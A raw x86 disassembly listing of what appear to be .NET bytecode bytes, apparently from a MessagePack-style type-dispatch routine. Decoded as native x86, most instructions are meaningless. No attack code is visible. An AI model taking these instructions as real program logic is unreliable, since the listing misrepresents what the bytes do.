  40364c:	00 06                	add    %al,(%esi)
  40364e:	0b 07                	or     (%edi),%eax
  403650:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	06                   	push   %es
  403658:	0a 06                	or     (%esi),%al
  40365a:	09 6f 38             	or     %ebp,0x38(%edi)
  40365d:	00 00                	add    %al,(%eax)
  40365f:	06                   	push   %es
  403660:	2b 02                	sub    (%edx),%eax
  403662:	07                   	pop    %es
  403663:	0a 11                	or     (%ecx),%dl
  403665:	05 17 58 13 05       	add    $0x5135817,%eax
  40366a:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  403670:	59                   	pop    %ecx
  403671:	32 cf                	xor    %bh,%cl
  403673:	08 08                	or     %cl,(%eax)
  403675:	8e 69 17             	mov    0x17(%ecx),%gs
  403678:	59                   	pop    %ecx
  403679:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  403680:	00 06                	add    %al,(%esi)
  403682:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403685:	04 15                	add    $0x15,%al
  403687:	31 0e                	xor    %ecx,(%esi)
  403689:	06                   	push   %es
  40368a:	7b 26                	jnp    0x4036b2
  40368c:	00 00                	add    %al,(%eax)
  40368e:	04 11                	add    $0x11,%al
  403690:	04 6f                	add    $0x6f,%al
  403692:	59                   	pop    %ecx
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 2a                	or     (%edx),%ch
  403697:	06                   	push   %es
  403698:	6f                   	outsl  %ds:(%esi),(%dx)
  403699:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40369e:	06                   	push   %es
  40369f:	09 6f 38             	or     %ebp,0x38(%edi)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	06                   	push   %es
  4036a5:	06                   	push   %es
  4036a6:	2a 00                	sub    (%eax),%al
  4036a8:	1b 30                	sbb    (%eax),%esi
  4036aa:	04 00                	add    $0x0,%al
  4036ac:	35 00 00 00 0f       	xor    $0xf000000,%eax
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	11 73 79             	adc    %esi,0x79(%ebx)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	0a 0a                	or     (%edx),%cl
  4036ba:	03 28                	add    (%eax),%ebp
  4036bc:	a0 00 00 06 10       	mov    0x10060000,%al
  4036c1:	01 06                	add    %eax,(%esi)
  4036c3:	03 16                	add    (%esi),%edx
  4036c5:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4036cb:	00 0a                	add    %cl,(%edx)
  4036cd:	06                   	push   %es
  4036ce:	16                   	push   %ss
  4036cf:	6a 6f                	push   $0x6f
  4036d1:	4e                   	dec    %esi
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	0a 02                	or     (%edx),%al
  4036d6:	06                   	push   %es
  4036d7:	28 56 00             	sub    %dl,0x0(%esi)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	de 0a                	fimuls (%edx)
  4036de:	06                   	push   %es
  4036df:	2c 06                	sub    $0x6,%al
  4036e1:	06                   	push   %es
  4036e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e3:	33 00                	xor    (%eax),%eax
  4036e5:	00 0a                	add    %cl,(%edx)
  4036e7:	dc 2a                	fsubrl (%edx)
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	00 01                	add    %al,(%ecx)
  4036ed:	10 00                	adc    %al,(%eax)
  4036ef:	00 02                	add    %al,(%edx)
  4036f1:	00 06                	add    %al,(%esi)
  4036f3:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	02 00                	add    (%eax),%al
  403700:	16                   	push   %ss
  403701:	00 00                	add    %al,(%eax)
  403703:	00 10                	add    %dl,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	11 03                	adc    %eax,(%ebx)
  403709:	19 73 77             	sbb    %esi,0x77(%ebx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	0a 0a                	or     (%edx),%cl
  403710:	02 06                	add    (%esi),%al
  403712:	28 56 00             	sub    %dl,0x0(%esi)
  403715:	00 06                	add    %al,(%esi)
  403717:	06                   	push   %es
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	41                   	inc    %ecx
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 2a                	or     (%edx),%ch
  40371e:	00 00                	add    %al,(%eax)
  403720:	13 30                	adc    (%eax),%esi
  403722:	04 00                	add    $0x0,%al
  403724:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  40372b:	11 03                	adc    %eax,(%ebx)
  40372d:	6f                   	outsl  %ds:(%esi),(%dx)
  40372e:	7a 00                	jp     0x403730
  403730:	00 0a                	add    %cl,(%edx)
  403732:	d2 0a                	rorb   %cl,(%edx)
  403734:	14 0b                	adc    $0xb,%al
  403736:	16                   	push   %ss
  403737:	0c 16                	or     $0x16,%al
  403739:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  40373e:	09 02                	or     %eax,(%edx)
  403740:	06                   	push   %es
  403741:	6e                   	outsb  %ds:(%esi),(%dx)
  403742:	28 42 00             	sub    %al,0x0(%edx)
  403745:	00 06                	add    %al,(%esi)
  403747:	2a 06                	sub    (%esi),%al
  403749:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  40374f:	42                   	inc    %edx
  403750:	06                   	push   %es
  403751:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  403757:	3a 02                	cmp    (%edx),%al
  403759:	28 39                	sub    %bh,(%ecx)
  40375b:	00 00                	add    %al,(%eax)
  40375d:	06                   	push   %es
  40375e:	02 18                	add    (%eax),%bl
  403760:	7d 24                	jge    0x403786
  403762:	00 00                	add    %al,(%eax)
  403764:	04 06                	add    $0x6,%al
  403766:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  40376c:	0c 16                	or     $0x16,%al
  40376e:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403773:	3a 00                	cmp    (%eax),%al
  403775:	00 06                	add    %al,(%esi)
  403777:	25 03 28 64 00       	and    $0x642803,%eax
  40377c:	00 06                	add    %al,(%esi)
  40377e:	6f                   	outsl  %ds:(%esi),(%dx)
  40377f:	38 00                	cmp    %al,(%eax)
  403781:	00 06                	add    %al,(%esi)
  403783:	03 6f 56             	add    0x56(%edi),%ebp
  403786:	00 00                	add    %al,(%eax)
  403788:	06                   	push   %es
  403789:	09 17                	or     %edx,(%edi)
  40378b:	58                   	pop    %eax
  40378c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403791:	2a 06                	sub    (%esi),%al
  403793:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403799:	36 06                	ss push %es
  40379b:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  4037a1:	2e 02 28             	add    %cs:(%eax),%ch
  4037a4:	39 00                	cmp    %eax,(%eax)
  4037a6:	00 06                	add    %al,(%esi)
  4037a8:	02 19                	add    (%ecx),%bl
  4037aa:	7d 24                	jge    0x4037d0
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 06                	add    $0x6,%al
  4037b0:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  4037b6:	0c 16                	or     $0x16,%al
  4037b8:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  4037bd:	3a 00                	cmp    (%eax),%al
  4037bf:	00 06                	add    %al,(%esi)
  4037c1:	03 6f 56             	add    0x56(%edi),%ebp
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	06                   	push   %es
  4037c7:	09 17                	or     %edx,(%edi)
  4037c9:	58                   	pop    %eax
  4037ca:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4037cf:	2a 06                	sub    (%esi),%al
  4037d1:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  4037d7:	1e                   	push   %ds
  4037d8:	06                   	push   %es
  4037d9:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4037df:	16                   	push   %ss
  4037e0:	06                   	push   %es
  4037e1:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4037e7:	0c 02                	or     $0x2,%al
  4037e9:	03 08                	add    (%eax),%ecx
  4037eb:	28 63 00             	sub    %ah,0x0(%ebx)
  4037ee:	00 06                	add    %al,(%esi)
  4037f0:	28 4f 00             	sub    %cl,0x0(%edi)
  4037f3:	00 06                	add    %al,(%esi)
  4037f5:	2a 06                	sub    (%esi),%al
  4037f7:	20 e0                	and    %ah,%al
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 32                	add    %dh,(%edx)
  4037fd:	12 06                	adc    (%esi),%al
  4037ff:	20 ff                	and    %bh,%bh
  403801:	00 00                	add    %al,(%eax)
  403803:	00 30                	add    %dh,(%eax)
  403805:	0a 02                	or     (%edx),%al
  403807:	06                   	push   %es
  403808:	67 6a 28             	addr16 push $0x28
  40380b:	42                   	inc    %edx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	06                   	push   %es
  40380f:	2a 06                	sub    (%esi),%al
  403811:	20 c0                	and    %al,%al
  403813:	00 00                	add    %al,(%eax)
  403815:	00 33                	add    %dh,(%ebx)
  403817:	07                   	pop    %es
  403818:	02 28                	add    (%eax),%ch
  40381a:	4e                   	dec    %esi
  40381b:	00 00                	add    %al,(%eax)
  40381d:	06                   	push   %es
  40381e:	2a 06                	sub    (%esi),%al
  403820:	20 c1                	and    %al,%cl
  403822:	00 00                	add    %al,(%eax)
  403824:	00 33                	add    %dh,(%ebx)
  403826:	0b 72 cf             	or     -0x31(%edx),%esi
  403829:	20 00                	and    %al,(%eax)
  40382b:	70 73                	jo     0x4038a0
  40382d:	7b 00                	jnp    0x40382f
  40382f:	00 0a                	add    %cl,(%edx)
  403831:	7a 06                	jp     0x403839
  403833:	20 c2                	and    %al,%dl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 33                	add    %dh,(%ebx)
  403839:	08 02                	or     %al,(%edx)
  40383b:	16                   	push   %ss
  40383c:	28 51 00             	sub    %dl,0x0(%ecx)
  40383f:	00 06                	add    %al,(%esi)
  403841:	2a 06                	sub    (%esi),%al
  403843:	20 c3                	and    %al,%bl
  403845:	00 00                	add    %al,(%eax)
  403847:	00 33                	add    %dh,(%ebx)
  403849:	08 02                	or     %al,(%edx)
  40384b:	17                   	pop    %ss
  40384c:	28 51 00             	sub    %dl,0x0(%ecx)
  40384f:	00 06                	add    %al,(%esi)
  403851:	2a 06                	sub    (%esi),%al
  403853:	20 c4                	and    %al,%ah
  403855:	00 00                	add    %al,(%eax)
  403857:	00 33                	add    %dh,(%ebx)
  403859:	20 03                	and    %al,(%ebx)
  40385b:	6f                   	outsl  %ds:(%esi),(%dx)
  40385c:	7a 00                	jp     0x40385e
  40385e:	00 0a                	add    %cl,(%edx)
  403860:	0c 08                	or     $0x8,%al
  403862:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403866:	01 0b                	add    %ecx,(%ebx)
  403868:	03 07                	add    (%edi),%eax
  40386a:	16                   	push   %ss
  40386b:	08 6f 45             	or     %ch,0x45(%edi)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0a 26                	or     (%esi),%ah
  403872:	02 07                	add    (%edi),%al
  403874:	28 47 00             	sub    %al,0x0(%edi)
  403877:	00 06                	add    %al,(%esi)
  403879:	2a 06                	sub    (%esi),%al
  40387b:	20 c5                	and    %al,%ch
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 33                	add    %dh,(%ebx)
  403881:	39 18                	cmp    %ebx,(%eax)
  403883:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403887:	01 0b                	add    %ecx,(%ebx)
  403889:	03 07                	add    (%edi),%eax
  40388b:	16                   	push   %ss
  40388c:	18 6f 45             	sbb    %ch,0x45(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 26                	or     (%esi),%ah
  403893:	07                   	pop    %es
  403894:	28 26                	sub    %ah,(%esi)
  403896:	00 00                	add    %al,(%eax)
  403898:	06                   	push   %es
  403899:	0b 07                	or     (%edi),%eax
  40389b:	16                   	push   %ss
  40389c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4038a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038a7:	01 0b                	add    %ecx,(%ebx)
  4038a9:	03 07                	add    (%edi),%eax
  4038ab:	16                   	push   %ss
  4038ac:	08 6f 45             	or     %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	02 07                	add    (%edi),%al
  4038b5:	28 47 00             	sub    %al,0x0(%edi)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2a 06                	sub    (%esi),%al
  4038bc:	20 c6                	and    %al,%dh
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	00 33                	add    %dh,(%ebx)
  4038c2:	39 1a                	cmp    %ebx,(%edx)
  4038c4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038c8:	01 0b                	add    %ecx,(%ebx)
  4038ca:	03 07                	add    (%edi),%eax
  4038cc:	16                   	push   %ss
  4038cd:	1a 6f 45             	sbb    0x45(%edi),%ch
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 26                	or     (%esi),%ah
  4038d4:	07                   	pop    %es
  4038d5:	28 26                	sub    %ah,(%esi)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	06                   	push   %es
  4038da:	0b 07                	or     (%edi),%eax
  4038dc:	16                   	push   %ss
  4038dd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4038e1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038e4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038e8:	01 0b                	add    %ecx,(%ebx)
  4038ea:	03 07                	add    (%edi),%eax
  4038ec:	16                   	push   %ss
  4038ed:	08 6f 45             	or     %ch,0x45(%edi)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 26                	or     (%esi),%ah
  4038f4:	02 07                	add    (%edi),%al
  4038f6:	28 47 00             	sub    %al,0x0(%edi)
  4038f9:	00 06                	add    %al,(%esi)
  4038fb:	2a 06                	sub    (%esi),%al
  4038fd:	20 c7                	and    %al,%bh
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 2e                	add    %ch,(%esi)
  403903:	10 06                	adc    %al,(%esi)
  403905:	20 c8                	and    %cl,%al
  403907:	00 00                	add    %al,(%eax)
  403909:	00 2e                	add    %ch,(%esi)
  40390b:	08 06                	or     %al,(%esi)
  40390d:	20 c9                	and    %cl,%cl
  40390f:	00 00                	add    %al,(%eax)
  403911:	00 33                	add    %dh,(%ebx)
  403913:	0b 72 fb             	or     -0x5(%edx),%esi
  403916:	20 00                	and    %al,(%eax)
  403918:	70 73                	jo     0x40398d
  40391a:	7b 00                	jnp    0x40391c
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	7a 06                	jp     0x403926
  403920:	20 ca                	and    %cl,%dl
  403922:	00 00                	add    %al,(%eax)
  403924:	00 33                	add    %dh,(%ebx)
  403926:	26 1a 8d 44 00 00 01 	sbb    %es:0x1000044(%ebp),%cl
  40392d:	0b 03                	or     (%ebx),%eax
  40392f:	07                   	pop    %es
  403930:	16                   	push   %ss
  403931:	1a 6f 45             	sbb    0x45(%edi),%ch
  403934:	00 00                	add    %al,(%eax)
  403936:	0a 26                	or     (%esi),%ah
  403938:	07                   	pop    %es
  403939:	28 26                	sub    %ah,(%esi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	06                   	push   %es
  40393e:	0b 02                	or     (%edx),%eax
  403940:	07                   	pop    %es
  403941:	16                   	push   %ss
  403942:	28 7d 00             	sub    %bh,0x0(%ebp)
  403945:	00 0a                	add    %cl,(%edx)
  403947:	28 52 00             	sub    %dl,0x0(%edx)
  40394a:	00 06                	add    %al,(%esi)
  40394c:	2a 06                	sub    (%esi),%al
  40394e:	20 cb                	and    %cl,%bl
  403950:	00 00                	add    %al,(%eax)
  403952:	00 33                	add    %dh,(%ebx)
  403954:	26 1e                	es push %ds
  403956:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40395a:	01 0b                	add    %ecx,(%ebx)
  40395c:	03 07                	add    (%edi),%eax
  40395e:	16                   	push   %ss
  40395f:	1e                   	push   %ds
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	45                   	inc    %ebp
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 26                	or     (%esi),%ah
  403966:	07                   	pop    %es
  403967:	28 26                	sub    %ah,(%esi)
  403969:	00 00                	add    %al,(%eax)
  40396b:	06                   	push   %es
  40396c:	0b 02                	or     (%edx),%eax
  40396e:	07                   	pop    %es
  40396f:	16                   	push   %ss
  403970:	28 7e 00             	sub    %bh,0x0(%esi)
  403973:	00 0a                	add    %cl,(%edx)
  403975:	28 53 00             	sub    %dl,0x0(%ebx)
  403978:	00 06                	add    %al,(%esi)
  40397a:	2a 06                	sub    (%esi),%al
  40397c:	20 cc                	and    %cl,%ah
  40397e:	00 00                	add    %al,(%eax)
  403980:	00 33                	add    %dh,(%ebx)
  403982:	11 03                	adc    %eax,(%ebx)
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	7a 00                	jp     0x403987
  403987:	00 0a                	add    %cl,(%edx)
  403989:	d2 0a                	rorb   %cl,(%edx)
  40398b:	02 06                	add    (%esi),%al
  40398d:	6e                   	outsb  %ds:(%esi),(%dx)
  40398e:	28 42 00             	sub    %al,0x0(%edx)
  403991:	00 06                	add    %al,(%esi)
  403993:	2a 06                	sub    (%esi),%al
  403995:	20 cd                	and    %cl,%ch
  403997:	00 00                	add    %al,(%eax)
  403999:	00 33                	add    %dh,(%ebx)
  40399b:	27                   	daa
  40399c:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  4039a2:	0b 03                	or     (%ebx),%eax
  4039a4:	07                   	pop    %es
  4039a5:	16                   	push   %ss
  4039a6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	0a 26                	or     (%esi),%ah
  4039ad:	07                   	pop    %es
  4039ae:	28 26                	sub    %ah,(%esi)
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 02                	or     (%edx),%eax
  4039b5:	07                   	pop    %es
  4039b6:	16                   	push   %ss
  4039b7:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4039bb:	0a 6e 28             	or     0x28(%esi),%ch
  4039be:	42                   	inc    %edx
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	06                   	push   %es
  4039c2:	2a 06                	sub    (%esi),%al
  4039c4:	20 ce                	and    %cl,%dh
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 33                	add    %dh,(%ebx)
  4039ca:	27                   	daa
  4039cb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4039d1:	0b 03                	or     (%ebx),%eax
  4039d3:	07                   	pop    %es
  4039d4:	16                   	push   %ss
  4039d5:	1a 6f 45             	sbb    0x45(%edi),%ch
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	28 26                	sub    %ah,(%esi)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	06                   	push   %es
  4039e2:	0b 02                	or     (%edx),%eax
  4039e4:	07                   	pop    %es
  4039e5:	16                   	push   %ss
  4039e6:	28 7f 00             	sub    %bh,0x0(%edi)
  4039e9:	00 0a                	add    %cl,(%edx)
  4039eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ec:	28 42 00             	sub    %al,0x0(%edx)
  4039ef:	00 06                	add    %al,(%esi)
  4039f1:	2a 06                	sub    (%esi),%al
  4039f3:	20 cf                	and    %cl,%bh
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 33                	add    %dh,(%ebx)
  4039f9:	26 1e                	es push %ds
  4039fb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4039ff:	01 0b                	add    %ecx,(%ebx)
  403a01:	03 07                	add    (%edi),%eax
  403a03:	16                   	push   %ss
  403a04:	1e                   	push   %ds
  403a05:	6f                   	outsl  %ds:(%esi),(%dx)
  403a06:	45                   	inc    %ebp
  403a07:	00 00                	add    %al,(%eax)
  403a09:	0a 26                	or     (%esi),%ah
  403a0b:	07                   	pop    %es
  403a0c:	28 26                	sub    %ah,(%esi)
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	0b 02                	or     (%edx),%eax
  403a13:	07                   	pop    %es
  403a14:	16                   	push   %ss
  403a15:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  403a1b:	43                   	inc    %ebx
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	2a 06                	sub    (%esi),%al
  403a21:	20 dc                	and    %bl,%ah
  403a23:	00 00                	add    %al,(%eax)
  403a25:	00 33                	add    %dh,(%ebx)
  403a27:	46                   	inc    %esi
  403a28:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403a2e:	0b 03                	or     (%ebx),%eax
  403a30:	07                   	pop    %es
  403a31:	16                   	push   %ss
  403a32:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 26                	or     (%esi),%ah
  403a39:	07                   	pop    %es
  403a3a:	28 26                	sub    %ah,(%esi)
  403a3c:	00 00                	add    %al,(%eax)
  403a3e:	06                   	push   %es
  403a3f:	0b 07                	or     (%edi),%eax
  403a41:	16                   	push   %ss
  403a42:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a48:	02 28                	add    (%eax),%ch
  403a4a:	39 00                	cmp    %eax,(%eax)
  403a4c:	00 06                	add    %al,(%esi)
  403a4e:	02 19                	add    (%ecx),%bl
  403a50:	7d 24                	jge    0x403a76
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 16                	add    $0x16,%al
  403a56:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403a5b:	3a 00                	cmp    (%eax),%al
  403a5d:	00 06                	add    %al,(%esi)
  403a5f:	03 6f 56             	add    0x56(%edi),%ebp
  403a62:	00 00                	add    %al,(%eax)
  403a64:	06                   	push   %es
  403a65:	09 17                	or     %edx,(%edi)
  403a67:	58                   	pop    %eax
  403a68:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403a6d:	2a 06                	sub    (%esi),%al
  403a6f:	20 dd                	and    %bl,%ch
  403a71:	00 00                	add    %al,(%eax)
  403a73:	00 33                	add    %dh,(%ebx)
  403a75:	46                   	inc    %esi
  403a76:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403a7c:	0b 03                	or     (%ebx),%eax
  403a7e:	07                   	pop    %es
  403a7f:	16                   	push   %ss
  403a80:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 26                	or     (%esi),%ah
  403a87:	07                   	pop    %es
  403a88:	28 26                	sub    %ah,(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	06                   	push   %es
  403a8d:	0b 07                	or     (%edi),%eax
  403a8f:	16                   	push   %ss
  403a90:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a96:	02 28                	add    (%eax),%ch
  403a98:	39 00                	cmp    %eax,(%eax)
  403a9a:	00 06                	add    %al,(%esi)
  403a9c:	02 19                	add    (%ecx),%bl
  403a9e:	7d 24                	jge    0x403ac4
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	04 16                	add    $0x16,%al
  403aa4:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403aa9:	3a 00                	cmp    (%eax),%al
  403aab:	00 06                	add    %al,(%esi)
  403aad:	03 6f 56             	add    0x56(%edi),%ebp
  403ab0:	00 00                	add    %al,(%eax)
  403ab2:	06                   	push   %es
  403ab3:	09 17                	or     %edx,(%edi)
  403ab5:	58                   	pop    %eax
  403ab6:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403abb:	2a 06                	sub    (%esi),%al
  403abd:	20 d9                	and    %bl,%cl
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	00 33                	add    %dh,(%ebx)
  403ac3:	0e                   	push   %cs
  403ac4:	02 06                	add    (%esi),%al
  403ac6:	03 28                	add    (%eax),%ebp
  403ac8:	65 00 00             	add    %al,%gs:(%eax)
  403acb:	06                   	push   %es
  403acc:	28 4f 00             	sub    %cl,0x0(%edi)
  403acf:	00 06                	add    %al,(%esi)
  403ad1:	2a 06                	sub    (%esi),%al
  403ad3:	20 de                	and    %bl,%dh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 33                	add    %dh,(%ebx)
  403ad9:	52                   	push   %edx
  403ada:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ae0:	0b 03                	or     (%ebx),%eax
  403ae2:	07                   	pop    %es
  403ae3:	16                   	push   %ss
  403ae4:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	0a 26                	or     (%esi),%ah
  403aeb:	07                   	pop    %es
  403aec:	28 26                	sub    %ah,(%esi)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	0b 07                	or     (%edi),%eax
  403af3:	16                   	push   %ss
  403af4:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403afa:	02 28                	add    (%eax),%ch
  403afc:	39 00                	cmp    %eax,(%eax)
  403afe:	00 06                	add    %al,(%esi)
  403b00:	02 18                	add    (%eax),%bl
  403b02:	7d 24                	jge    0x403b28
  403b04:	00 00                	add    %al,(%eax)
  403b06:	04 16                	add    $0x16,%al
  403b08:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b0d:	3a 00                	cmp    (%eax),%al
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	25 03 28 64 00       	and    $0x642803,%eax
  403b16:	00 06                	add    %al,(%esi)
  403b18:	6f                   	outsl  %ds:(%esi),(%dx)
  403b19:	38 00                	cmp    %al,(%eax)
  403b1b:	00 06                	add    %al,(%esi)
  403b1d:	03 6f 56             	add    0x56(%edi),%ebp
  403b20:	00 00                	add    %al,(%eax)
  403b22:	06                   	push   %es
  403b23:	09 17                	or     %edx,(%edi)
  403b25:	58                   	pop    %eax
  403b26:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b2b:	2a 06                	sub    (%esi),%al
  403b2d:	20 de                	and    %bl,%dh
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	00 33                	add    %dh,(%ebx)
  403b33:	52                   	push   %edx
  403b34:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403b3a:	0b 03                	or     (%ebx),%eax
  403b3c:	07                   	pop    %es
  403b3d:	16                   	push   %ss
  403b3e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 26                	or     (%esi),%ah
  403b45:	07                   	pop    %es
  403b46:	28 26                	sub    %ah,(%esi)
  403b48:	00 00                	add    %al,(%eax)
  403b4a:	06                   	push   %es
  403b4b:	0b 07                	or     (%edi),%eax
  403b4d:	16                   	push   %ss
  403b4e:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403b54:	02 28                	add    (%eax),%ch
  403b56:	39 00                	cmp    %eax,(%eax)
  403b58:	00 06                	add    %al,(%esi)
  403b5a:	02 18                	add    (%eax),%bl
  403b5c:	7d 24                	jge    0x403b82
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	04 16                	add    $0x16,%al
  403b62:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b67:	3a 00                	cmp    (%eax),%al
  403b69:	00 06                	add    %al,(%esi)
  403b6b:	25 03 28 64 00       	and    $0x642803,%eax
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	38 00                	cmp    %al,(%eax)
  403b75:	00 06                	add    %al,(%esi)
  403b77:	03 6f 56             	add    0x56(%edi),%ebp
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	06                   	push   %es
  403b7d:	09 17                	or     %edx,(%edi)
  403b7f:	58                   	pop    %eax
  403b80:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b85:	2a 06                	sub    (%esi),%al
  403b87:	20 df                	and    %bl,%bh
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 33                	add    %dh,(%ebx)
  403b8d:	52                   	push   %edx
  403b8e:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403b94:	0b 03                	or     (%ebx),%eax
  403b96:	07                   	pop    %es
  403b97:	16                   	push   %ss
  403b98:	1a 6f 45             	sbb    0x45(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 26                	or     (%esi),%ah
  403b9f:	07                   	pop    %es
  403ba0:	28 26                	sub    %ah,(%esi)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	0b 07                	or     (%edi),%eax
  403ba7:	16                   	push   %ss
  403ba8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403bac:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403baf:	28 39                	sub    %bh,(%ecx)
  403bb1:	00 00                	add    %al,(%eax)
